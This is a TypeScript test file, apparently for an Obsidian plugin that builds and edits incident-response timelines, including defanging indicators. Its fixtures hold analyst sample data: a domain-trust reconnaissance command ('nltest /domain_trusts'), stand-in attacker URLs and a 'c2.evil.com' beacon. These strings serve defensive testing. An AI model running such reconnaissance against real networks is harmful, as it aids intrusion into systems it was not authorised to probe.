  const caret = (lines: string[], line: number) => insertTimeline(lines, line, 'events')?.cursor

  it('turns a blank line into the marker and one empty item, caret at its end', () => {
    expect(apply([''], insertTimeline([''], 0, 'events'))).toEqual([TIMELINE_MARKER, '- '])
    expect(caret([''], 0)).toEqual({ line: 1, ch: 2 })
    const note = ['## Findings', '', 'After.']
    expect(apply(note, insertTimeline(note, 1, 'events'))).toEqual(['## Findings', TIMELINE_MARKER, '- ', '', 'After.'])
    expect(caret(note, 1)).toEqual({ line: 2, ch: 2 })
  })

  it('goes after a paragraph or a heading, a blank line before it only after a paragraph', () => {
    const para = ['Para.', 'Next.']
    expect(apply(para, insertTimeline(para, 0, 'events'))).toEqual(['Para.', '', TIMELINE_MARKER, '- ', '', 'Next.'])
    expect(caret(para, 0)).toEqual({ line: 3, ch: 2 })
    expect(apply(['## F', 'Para'], insertTimeline(['## F', 'Para'], 0, 'events'))).toEqual([
      '## F',
      TIMELINE_MARKER,
      '- ',
      '',
      'Para'
    ])
    expect(apply(['## F'], insertTimeline(['## F'], 0, 'events'))).toEqual(['## F', TIMELINE_MARKER, '- '])
    // A blank line under a paragraph stays one, so the empty item is not read as more of the paragraph.
    const blank = ['Para.', '', 'Next.']
    expect(apply(blank, insertTimeline(blank, 1, 'events'))).toEqual(['Para.', '', TIMELINE_MARKER, '- ', '', 'Next.'])
  })

  it('writes the marker of the style asked for', () => {
    expect(apply([''], insertTimeline([''], 0, 'steps'))).toEqual(['%% timeline steps %%', '- '])
    expect(apply(['x'], insertTimeline(['x'], 0, 'chain'))).toEqual(['x', '', '%% timeline chain %%', '- '])
  })

  it('keeps a list below out of the new timeline with a second blank line', () => {
    const heading = ['## F', '', '- a']
    const out = apply(heading, insertTimeline(heading, 1, 'events'))
    expect(out).toEqual(['## F', TIMELINE_MARKER, '- ', '', '', '- a'])
    expect(findTimelines(out)[0].events).toHaveLength(1)
    const para = ['Para', '', '- a']
    expect(apply(para, insertTimeline(para, 0, 'events'))).toEqual(['Para', '', TIMELINE_MARKER, '- ', '', '', '- a'])
    const indented = ['Para', '    more of it']
    const kept = apply(indented, insertTimeline(indented, 0, 'events'))
    expect(findTimelines(kept)[0]).toMatchObject({ lastLine: 3, events: [{ text: '', details: [] }] })
  })

  it('goes after a timeline that ends above it, leaving that one whole', () => {
    const note = [TIMELINE_MARKER, '- a', '', 'After.']
    const out = apply(note, insertTimeline(note, 2, 'steps'))
    expect(out).toEqual([TIMELINE_MARKER, '- a', '', '%% timeline steps %%', '- ', '', 'After.'])
    expect(findTimelines(out).map((b) => [b.style, b.events.length])).toEqual([
      ['events', 1],
      ['steps', 1]
    ])
  })

  it('offers nothing in a timeline, the frontmatter or a code block', () => {
    for (let line = 1; line < CLICKFIX.length; line++) expect(insertTimeline(CLICKFIX, line, 'events')).toBeNull()
    expect(insertTimeline([TIMELINE_MARKER, '', '- a'], 1, 'events')).toBeNull()
    const front = ['---', 'a: 1', '---', '']
    for (const line of [0, 1, 2]) expect(insertTimeline(front, line, 'events')).toBeNull()
    expect(apply(front, insertTimeline(front, 3, 'events')).slice(3)).toEqual(['', TIMELINE_MARKER, '- '])
    const code = ['```', '', '```']
    for (const line of [0, 1, 2]) expect(insertTimeline(code, line, 'events')).toBeNull()
  })

  it('offers nothing in a callout or quote, a table, a comment or a math block, which it would split', () => {
    const callout = ['> [!note] Triage', '> first line', '>', '> second line']
    for (let line = 0; line < callout.length; line++) expect(insertTimeline(callout, line, 'steps')).toBeNull()
    const table = ['| IOC | Type |', '| --- | --- |', '| 1.2.3.4 | IP |', 'After.']
    for (const line of [0, 1, 2]) expect(insertTimeline(table, line, 'events')).toBeNull()
    expect(apply(table, insertTimeline(table, 3, 'events')).slice(0, 4)).toEqual(table)
    const comment = ['%% hidden', '', 'still hidden %%', 'After.']
    for (const line of [0, 1]) expect(insertTimeline(comment, line, 'events')).toBeNull()
    const math = ['$$', 'x^2', '$$']
    for (const line of [0, 1]) expect(insertTimeline(math, line, 'events')).toBeNull()
    // On the line that closes one, the timeline goes after it.
    expect(apply(comment, insertTimeline(comment, 2, 'events'))).toEqual([
      ...comment.slice(0, 3),
      '',
      TIMELINE_MARKER,
      '- ',
      '',
      'After.'
    ])
    expect(apply(math, insertTimeline(math, 2, 'events'))).toEqual([...math, '', TIMELINE_MARKER, '- '])
  })

  it('still goes after a closed comment, a line of math or a paragraph with a pipe in it', () => {
    for (const text of ['%% note to self %%', '$$x^2$$', 'Ran `a | b` then', '| not a table |']) {
      expect(apply([text], insertTimeline([text], 0, 'events'))).toEqual([text, '', TIMELINE_MARKER, '- '])
    }
    expect(apply(['%% a %%', ''], insertTimeline(['%% a %%', ''], 1, 'events'))).toEqual([
      '%% a %%',
      '',
      TIMELINE_MARKER,
      '- '
    ])
  })
})

describe('setStyle', () => {
  it('rewrites the marker for the style, indent kept', () => {
    const out = apply(CLICKFIX, setStyle(CLICKFIX, 5, 'steps'))
    expect(out).toEqual([CLICKFIX[0], '%% timeline steps %%', ...CLICKFIX.slice(2)])
    expect(findTimelines(out)[0].style).toBe('steps')
    const indented = ['  %% timeline chain %%', '  - a']
    expect(apply(indented, setStyle(indented, 1, 'events'))).toEqual([`  ${TIMELINE_MARKER}`, '  - a'])
  })

  it('offers nothing for the style it has, or outside a timeline', () => {
    expect(setStyle(CLICKFIX, 1, 'events')).toBeNull()
    expect(setStyle(CLICKFIX, 0, 'steps')).toBeNull()
  })
})

describe('makeTimeline with a style', () => {
  it("writes the style's marker", () => {
    expect(apply(['- one', '- two'], makeTimeline(['- one', '- two'], 0, 0, 'chain'))).toEqual([
      CHAINED,
      '- one',
      '- two'
    ])
    expect(apply(['a', 'b'], makeTimeline(['a', 'b'], 0, 1, 'steps'))).toEqual([STEPS, '- a', '- b'])
  })
})

describe('chain: addChild', () => {
  it('adds an empty child one indent deeper, after the link and everything under it', () => {
    const edit = addChild(CHAIN, 2)
    expect(apply(CHAIN, edit)).toEqual([...CHAIN.slice(0, 5), '    - ', ...CHAIN.slice(5)])
    expect(edit?.cursor).toEqual({ line: 5, ch: 6 })
    // From its note, the same link.
    expect(addChild(CHAIN, 3)).toEqual(edit)
    expect(apply(CHAIN, addChild(CHAIN, 1))).toEqual([...CHAIN.slice(0, 7), '  - ', CHAIN[7]])
    expect(apply(CHAIN, addChild(CHAIN, 4))).toEqual([...CHAIN.slice(0, 5), '      - ', ...CHAIN.slice(5)])
  })

  it("takes the block's own indent unit and bullet, else a tab", () => {
    expect(apply([CHAINED, '* a'], addChild([CHAINED, '* a'], 1))).toEqual([CHAINED, '* a', '\t* '])
    expect(addChild([CHAINED, '* a'], 1)?.cursor).toEqual({ line: 2, ch: 3 })
    const four = [CHAINED, '- a', '    * b', '- c']
    expect(apply(four, addChild(four, 3))).toEqual([...four, '    * '])
  })

  it('offers nothing on the marker, outside, or in another style', () => {
    expect(addChild(CHAIN, 0)).toBeNull()
    expect(addChild(['x', ...CHAIN], 0)).toBeNull()
    expect(addChild(CLICKFIX, 3)).toBeNull()
  })
})

describe('chain: siblings, move and delete take the subtree', () => {
  it('adds a sibling at the same depth after the link and its subtree', () => {
    const edit = addEventBelow(CHAIN, 2)
    expect(apply(CHAIN, edit)).toEqual([...CHAIN.slice(0, 5), '  - ', ...CHAIN.slice(5)])
    expect(edit?.cursor).toEqual({ line: 5, ch: 4 })
    expect(addEventBelow(CHAIN, 3)).toEqual(edit)
    // A root, as an event.
    expect(apply(CHAIN, addEventBelow(CHAIN, 1))).toEqual([...CHAIN.slice(0, 7), '- ', CHAIN[7]])
  })

  it('moves a link with its notes and children among its siblings, caret following', () => {
    const swapped = [CHAIN[0], CHAIN[1], CHAIN[5], CHAIN[6], CHAIN[2], CHAIN[3], CHAIN[4], CHAIN[7]]
    const down = moveEvent(CHAIN, 2, 'down')
    expect(apply(CHAIN, down)).toEqual(swapped)
    expect(down?.cursor).toEqual({ line: 4, ch: CHAIN[2].length })
    expect(moveEvent(CHAIN, 3, 'down')?.cursor).toEqual({ line: 5, ch: CHAIN[3].length })
    const up = moveEvent(CHAIN, 5, 'up')
    expect(apply(CHAIN, up)).toEqual(swapped)
    expect(up?.cursor).toEqual({ line: 2, ch: CHAIN[5].length })
  })

  it('moves no link past its first or last sibling, and a root as an event', () => {
    expect(moveEvent(CHAIN, 4, 'up')).toBeNull()
    expect(moveEvent(CHAIN, 4, 'down')).toBeNull()
    expect(moveEvent(CHAIN, 2, 'up')).toBeNull()
    expect(moveEvent(CHAIN, 6, 'down')).toBeNull()
    expect(apply(CHAIN, moveEvent(CHAIN, 7, 'up'))).toEqual([CHAINED, CHAIN[7], ...CHAIN.slice(1, 7)])
  })

  it('leaves blank lines between siblings where they are', () => {
    const loose = [CHAINED, '- a', '  - b', '', '  - c']
    expect(apply(loose, moveEvent(loose, 4, 'up'))).toEqual([CHAINED, '- a', '  - c', '', '  - b'])
  })

  it('deletes a link with its subtree, caret on the line above', () => {
    const edit = deleteEvent(CHAIN, 2)
    expect(apply(CHAIN, edit)).toEqual([...CHAIN.slice(0, 2), ...CHAIN.slice(5)])
    expect(edit?.cursor).toEqual({ line: 1, ch: CHAIN[1].length })
    expect(apply(CHAIN, deleteEvent(CHAIN, 6))).toEqual([...CHAIN.slice(0, 6), CHAIN[7]])
    expect(apply(CHAIN, deleteEvent(CHAIN, 1))).toEqual([CHAINED, CHAIN[7]])
    const loose = [CHAINED, '- a', '  - b', '', '  - c', '', '  - d']
    expect(apply(loose, deleteEvent(loose, 4))).toEqual([CHAINED, '- a', '  - b', '', '  - d'])
  })
})

describe('the other styles', () => {
  it('sorts by time only in events', () => {
    for (const style of ['steps', 'chain'] as const) {
      expect(sortEventsByTime([markerFor(style), '- 11:06 b', '- 11:04 a'], 1)).toBeNull()
    }
  })

  it('defangs, goes back to a plain list and copies in every style', () => {
    const note = [STEPS, '- Visited: https://evil.example/a', '- Details', '    - IP: 10.0.0.5']
    expect(apply(note, defangTimeline(note, 1)?.edit ?? null).slice(1)).toEqual([
      '- Visited: hxxps://evil[.]example/a',
      '- Details',
      '    - IP: 10[.]0[.]0[.]5'
    ])
    expect(copyText(note, 0)?.split('\n')).toEqual([
      'Steps (1)',
      '1. Visited: hxxps://evil[.]example/a',
      '',
      'IP: 10[.]0[.]0[.]5'
    ])
    expect(apply(CHAIN, backToPlainList(CHAIN, 4))).toEqual(CHAIN.slice(1))
    expect(copyText(CHAIN, 1)?.split('\n')[0]).toBe('Process chain (6 links)')
  })
})

/** Just enough of Obsidian's Editor over a string, recording each transaction. */
class FakeEditor {
  transactions: EditorTransaction[] = []
  cursor: EditorPosition | null = null
  constructor(public doc: string) {}
  getLine(n: number): string {
    return this.doc.split('\n')[n]
  }
  posToOffset(p: EditorPosition): number {
    return this.doc
      .split('\n')
      .slice(0, p.line)
      .reduce((n, l) => n + l.length + 1, p.ch)
  }
  offsetToPos(offset: number): EditorPosition {
    const before = this.doc.slice(0, offset).split('\n')
    return { line: before.length - 1, ch: before[before.length - 1].length }
  }
  getRange(from: EditorPosition, to: EditorPosition): string {
    return this.doc.slice(this.posToOffset(from), this.posToOffset(to))
  }
  transaction(tx: EditorTransaction): void {
    this.transactions.push(tx)
    for (const c of tx.changes ?? []) {
      const from = this.posToOffset(c.from)
      this.doc = this.doc.slice(0, from) + c.text + this.doc.slice(this.posToOffset(c.to ?? c.from))
    }
  }
  setCursor(p: EditorPosition): void {
    this.cursor = p
  }
}

describe('applyEdit', () => {
  const run = (lines: string[], edit: TimelineEdit | null) => {
    if (!edit) throw new Error('no edit')
    const editor = new FakeEditor(lines.join('\n'))
    applyEdit(editor as unknown as Editor, edit)
    return editor
  }

  it('applies an edit as one transaction and sets the caret', () => {
    const editor = run(CLICKFIX, moveEvent(CLICKFIX, 3, 'down'))
    expect(editor.doc).toBe(apply(CLICKFIX, moveEvent(CLICKFIX, 3, 'down')).join('\n'))
    expect(editor.transactions).toHaveLength(1)
    expect(editor.cursor).toEqual({ line: 4, ch: CLICKFIX[3].length })
  })

  it('replaces only the text that differs, so the caret elsewhere stays put', () => {
    const editor = run(CLICKFIX, setEventKind(CLICKFIX, 3, 'web'))
    expect(editor.transactions[0].changes).toEqual([
      { from: { line: 3, ch: 15 }, to: { line: 3, ch: 15 }, text: 'Web: ' }
    ])
    expect(editor.cursor).toBeNull()
    const marker = run(['- one', '- two'], makeTimeline(['- one', '- two'], 1, 1))
    expect(marker.transactions[0].changes).toEqual([
      { from: { line: 0, ch: 0 }, to: { line: 0, ch: 0 }, text: `${TIMELINE_MARKER}\n` }
    ])
  })

  it('removes whole lines, newline included', () => {
    const editor = run(CLICKFIX, backToPlainList(CLICKFIX, 1))
    expect(editor.doc).toBe([CLICKFIX[0], ...CLICKFIX.slice(2)].join('\n'))
    expect(run([TIMELINE_MARKER, '- one'], backToPlainList([TIMELINE_MARKER, '- one'], 0)).doc).toBe('- one')
  })

  it('writes nothing when nothing changes', () => {
    const editor = run(CLICKFIX, defangTimeline(CLICKFIX, 1)?.edit ?? null)
    expect(editor.transactions).toEqual([])
    expect(editor.doc).toBe(CLICKFIX.join('\n'))
  })
})

/** The steps sample from the styles spec: six steps, then the Details bullet whose lines are the facts. */
const STORY = [
  '## Alert story',
  STEPS,
  '- 21:34 Alert fired: Potential Recon Activity Via Nltest.EXE',
  '- On host: DESKTOP1.domain.local',
  '- User context: domain\\user1',
  '- Process launch: nltest.exe',
  '- Command executed: nltest /domain_trusts',
  '- Artifact path: C:\\Users\\user1\\Downloads\\',
  '- Details',
  '    - Alert ID: SEC-2023-0704-0001',
  '    - Time: 2023-07-04 21:34 UTC',
  '    - Host: DESKTOP1.domain.local',
  '      192.168.56.95'
]

describe('steps: the closing Details bullet stays last', () => {
  const shape = (lines: string[]) => {
    const block = findTimelines(lines)[0]
    return { steps: block.steps.map((s) => s.event.text), facts: block.facts.length }
  }

  it('adds a step at the end above the Details bullet, from the add row and from Details or a fact', () => {
    const added = [...STORY.slice(0, 8), '- ', ...STORY.slice(8)]
    for (const line of [1, 3, 8, 9, 12]) {
      const edit = addEventAtEnd(STORY, line)
      expect(apply(STORY, edit)).toEqual(added)
      expect(edit?.cursor).toEqual({ line: 8, ch: 2 })
    }
    for (const line of [8, 9, 11, 12]) expect(apply(STORY, addEventBelow(STORY, line))).toEqual(added)
    expect(shape(added)).toEqual({ steps: [...shape(STORY).steps, ''], facts: 3 })
    // A step's own Add below is unchanged.
    expect(apply(STORY, addEventBelow(STORY, 3))).toEqual([...STORY.slice(0, 4), '- ', ...STORY.slice(4)])
  })

  it('with no step yet, adds the first one above Details', () => {
    const facts = [STEPS, '- Details', '    - Alert ID: 1']
    expect(apply(facts, addEventAtEnd(facts, 0))).toEqual([STEPS, '- ', ...facts.slice(1)])
    expect(apply(facts, addEventBelow(facts, 2))).toEqual([STEPS, '- ', ...facts.slice(1)])
  })

  it('moves no step below Details and never Details or its facts', () => {
    expect(moveEvent(STORY, 7, 'down')).toBeNull()
    expect(shape(apply(STORY, moveEvent(STORY, 7, 'up'))).facts).toBe(3)
    for (const line of [8, 9, 12]) {
      expect(moveEvent(STORY, line, 'up')).toBeNull()
      expect(moveEvent(STORY, line, 'down')).toBeNull()
    }
  })

  it('leaves a list without facts as it was: a last Details bullet with nothing under it is a step', () => {
    const plain = [STEPS, '- a', '- Details']
    expect(apply(plain, addEventAtEnd(plain, 0))).toEqual([...plain, '- '])
    expect(apply(plain, moveEvent(plain, 1, 'down'))).toEqual([STEPS, '- Details', '- a'])
  })
})

describe('a file named by itself stays as written', () => {
  const chain = [CHAINED, '- Initial process: cmd.exe', '    - Terminal process: nltest.exe']

  it('is not defanged or copied defanged, in steps or a chain', () => {
    expect(defangTimeline(chain, 1)?.changed).toBe(false)
    expect(copyText(chain, 1)?.split('\n')).toEqual([
      'Process chain (2 links)',
      'cmd.exe (Initial process)',
      '  → nltest.exe (Terminal process)'
    ])
    const steps = [STEPS, '- Process launch: nltest.exe', '- On host: DESKTOP1.domain.local', '- Beacon: c2.evil.com']
    expect(apply(steps, defangTimeline(steps, 1)?.edit ?? null).slice(1)).toEqual([
      '- Process launch: nltest.exe',
      '- On host: DESKTOP1.domain.local',
      defangText('- Beacon: c2.evil.com')
    ])
  })
})
